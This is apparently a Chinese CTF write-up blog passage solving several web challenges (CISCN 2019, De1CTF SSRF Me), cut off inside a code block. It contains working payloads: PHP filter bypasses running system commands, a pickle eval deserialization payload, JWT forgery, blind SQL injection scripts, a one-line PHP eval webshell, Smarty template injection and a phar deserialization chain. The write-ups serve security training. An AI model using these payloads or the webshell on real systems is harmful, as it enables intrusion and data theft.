<p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=ls /</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> ==&gt;  <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">(<span class="number">1598506324</span>)</span></span>  ==&gt;  <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span><span class="params">(dechex(<span class="number">1598506324</span>)</span></span>)</span><br><span class="line">==&gt; hex2bin(<span class="string">&quot;5f474554&quot;</span>) ==&gt; <span class="string">&quot;_GET&quot;</span></span><br><span class="line">$_GET&#123;pi&#125;&#123;$_GET&#123;abs&#125;&#125; ==&gt; system(<span class="string">&#x27;ls /&#x27;</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>方法二：构造<code>getallheaders</code></p>
<p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line">$pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line">exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>发包时用burp抓包，在headers添加<code>1: cat /flag</code></p>
<p>方法三：异或</p>
<p>fuzz：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</code></p>
<h4 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h4><p>先注册个账号，找到lv6的号，</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://26f12b49-df5d-419d-9c3a-50988d616703.node1.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1000</span>):</span><br><span class="line">    r = requests.<span class="built_in">get</span>(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> in r.<span class="built_in">text</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后购买，抓包，把discount改成0.000000000001，就可以买下来。</p>
<p>发现只有admin可以访问，查看cookie，有一个jwt，到 jwt.io ，解码，把 username 改为admin ，用 <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker%EF%BC%8C%E8%B7%91%E5%87%BA%E7%AD%BE%E5%90%8D%E4%B8%BA">https://github.com/brendan-rius/c-jwt-cracker，跑出签名为</a> 1Kun，再到 jwt.io得到 jwt，<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code>，用edit this cookie改成新的jwt，刷新可以看到 “一键成为大会员”，也可以看到源码，打开源码里面admin.py，看到pickle.loads(urllib.qoute(become))，（反序列化文章，<a target="_blank" rel="noopener" href="http://www.sohu.com/a/274879579_729271%EF%BC%89%EF%BC%8C%E4%B8%80%E9%94%AE%E6%88%90%E4%B8%BA%E5%A4%A7%E4%BC%9A%E5%91%98%E6%8C%89%E9%92%AE%E4%BC%9Apost%E4%B8%80%E4%B8%AA">http://www.sohu.com/a/274879579_729271），一键成为大会员按钮会post一个</a> become 参数，利用反序列化漏洞读取flag</p>
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> urllib</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">import</span> pickle</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="class"><span class="keyword">class</span> <span class="title">a</span>(<span class="params">object</span>):</span></span></span><br><span class="line"><span class="meta">...</span> <span class="python">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span></span><br><span class="line"><span class="meta">...</span> <span class="python">            <span class="keyword">return</span> (eval,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span></span><br><span class="line"><span class="meta">...</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">a = pickle.dumps(a())</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python">a = urllib.quote(a)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt;</span> <span class="python"><span class="keyword">print</span> a</span></span><br></pre></td></tr></table></figure>

<p>得到<code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code>，抓包，把become=admin改成上面的字符串，得到flag</p>
<h4 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>一共就两条数据，过滤了空格，and，or，布尔盲注。</p>
<p>可以使用<code>id=0^[payload]</code>或者<code>id=if([payload],1,2)</code>。后者只能用于数字型。</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c30faac4-d474-4905-a58f-c43c968a74ac.node3.buuoj.cn:80/index.php&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">left</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">right</span> = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">right</span> - <span class="built_in">left</span> == <span class="number">1</span>:</span><br><span class="line">            print(<span class="built_in">chr</span>(<span class="built_in">right</span>), <span class="keyword">end</span>=<span class="comment">&#x27;&#x27;)</span></span><br><span class="line">            break</span><br><span class="line">        <span class="built_in">mid</span> = <span class="built_in">int</span>((<span class="built_in">right</span>+<span class="built_in">left</span>)/<span class="number">2</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>.format(i, <span class="built_in">mid</span>)&#125;</span><br><span class="line">        r = requests.post(url, data=data, proxies=&#123;<span class="comment">&#x27;http&#x27;:&#x27;127.0.0.1:9999&#x27;&#125;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="comment">&#x27;Hello&#x27; in r.text:</span></span><br><span class="line">            <span class="built_in">left</span> = <span class="built_in">mid</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">right</span> = <span class="built_in">mid</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可能是在<code>print()</code>函数中用<code>end</code>关键字参数的话不会刷新缓冲区，大概觉着跑完了就Ctrl+C，就能看到结果了 = =。</p>
<h4 id="CISCN2019-总决赛-Day2-Web1-Easyweb-1"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb-1" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>robots.txt，有 image.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>不应该过<code>\\0</code>,传入<code>\0</code>,加反斜线变成<code>\\\0</code>，过之后变成<code>\</code>，可以逃逸。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image.php?id=\<span class="number">0</span>&amp;path=+<span class="keyword">or</span>+id=<span class="number">3</span>+order+by+<span class="number">2</span>%<span class="number">23</span> # 成功</span><br><span class="line">image.php?id=\<span class="number">0</span>&amp;path=+<span class="keyword">or</span>+id=<span class="number">3</span>+order+by+<span class="number">3</span>%<span class="number">23</span> # 失败</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b74c9739-071c-4a0f-9c97-f7eff3e4438e.node3.buuoj.cn/image.php&quot;</span></span><br><span class="line">result = <span class="comment">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">    <span class="built_in">right</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">left</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">mid</span> = <span class="built_in">int</span>((<span class="built_in">right</span> + <span class="built_in">left</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">right</span> &gt; <span class="built_in">left</span>:</span><br><span class="line">        payload = <span class="string">&quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, <span class="built_in">mid</span>)</span><br><span class="line">        # <span class="keyword">select</span> group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">        #</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="comment">&#x27;id&#x27;: &#x27;\\0&#x27;,</span></span><br><span class="line">            <span class="comment">&#x27;path&#x27;: payload</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">response</span> = requests.<span class="keyword">get</span>(url, params=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> <span class="built_in">response</span>.text:</span><br><span class="line">            <span class="built_in">left</span> = <span class="built_in">mid</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">right</span> = <span class="built_in">mid</span></span><br><span class="line">        <span class="built_in">mid</span> = <span class="built_in">int</span>((<span class="built_in">right</span> + <span class="built_in">left</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">mid</span>)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>回显位置，发现是 php，有上传的文件名。再次上传文件名为 php 木马的文件，连接日志文件获得 shell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">logs</span>/upload.<span class="number">1</span>de<span class="number">80834766269</span>f<span class="number">33</span>c<span class="number">963</span>dd<span class="number">093</span>dee<span class="number">010</span>.log.php</span><br></pre></td></tr></table></figure>

<p>文件名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h4><p>Smarty 模板注入，可以使用一些 php 语句</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;if show_source(<span class="name">&#x27;/flag&#x27;</span>)&#125;&#123;/if&#125;</span><br><span class="line">&#123;readfile(<span class="name">&#x27;/flag&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h4><p>走一遍正常流程，注册登录，上传只能传图，下载的地方抓一下包，filename这里有路径穿越，读了index, upload, download, class, delete, login，开始审计。</p>
<p>upload里面会检查文件类型，然后把后缀名改成图片的类型，默认是gif。</p>
<p>download限制了文件名长度，其中不能含有flag。</p>
<p>重点是class.php，其中有3个类，FIle, Filelist, User</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FIle类中的<code>close()</code>有<code>file_get_contents()</code>可以用来获取flag，但是没有输出</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class<span class="built_in"> User </span>&#123;</span><br><span class="line">	public <span class="variable">$db</span>;</span><br><span class="line">	public function __destruct() &#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;db-&gt;close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User类中有<code>__destruct()</code>，在User类销毁的时候可以调用db的close方法，如果db是一个File类的实例，就能调用FIle的close读取flag，但还是不能输出。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $files;</span><br><span class="line">	<span class="keyword">private</span> $results;</span><br><span class="line">	<span class="keyword">private</span> $funcs;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>) </span>&#123;</span><br><span class="line">		array_push(<span class="keyword">$this</span>-&gt;func, $func);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$table = <span class="string">&#x27;html...&#x27;</span>;</span><br><span class="line">	$table .= <span class="string">&#x27;html...&#x27;</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">		$table .= <span class="string">&#x27;html...&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$table .= <span class="string">&#x27;html...&#x27;</span></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">		$table .=<span class="string">&#x27;html..&#x27;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">			$table .= <span class="string">&#x27;..&#x27;</span>.htmlentities($value).<span class="string">&#x27;..&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$table .= <span class="string">&#x27;...&#x27;</span>.htmlentities($filename).<span class="string">&#x27;..&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $table;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FileList 类中有<code>__call()</code>，可以调用File的<code>close()</code>，还能存储结果输出出来。</p>
<p>思路：创建一个User类的对象，它的db变量是一个FileList对象，FileList的files变量是包含一个File对象的数组，这个File对象的filename变量是flag的位置。User对象销毁时会调用db的<code>close()</code>，db是一个FIleLIst对象，没有<code>close()</code>的情况下会调用<code>__call()</code>，再调用File（$filename=’/flag.txt’）的<code>close()</code>，返回值存到FileList的$result里，再打印出来。</p>
<p>可以利用phar创建符合以上要求的对象，可以参考博客里的 phar扩展php反序列化攻击面。生成phar：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;jwt.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很多文件系统函数可以触发phar的反序列化，这个网站有上传、下载和删除操作，都看一遍，上传和下载都没什么，删除的地方有个unlink，正好可以利用，把生成的phar后缀名改成jpg，上传，在删除的地方抓包，可以得到flag。</p>
<h4 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 